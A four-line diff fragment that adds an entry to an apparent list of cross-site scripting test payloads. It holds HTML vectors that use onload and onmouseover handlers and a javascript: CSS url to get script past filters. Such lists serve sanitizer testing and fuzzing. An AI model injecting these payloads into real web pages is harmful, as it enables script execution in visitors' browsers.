@@ -1,3 +1,4 @@
+<IMG alt=``onload=xss() src=x>
 <div style="background:url('javascript:alert(1)')">
 <sopas style=font-size:200px onmouseover=alert(1)>
 <meter onmouseover="alert(1)">
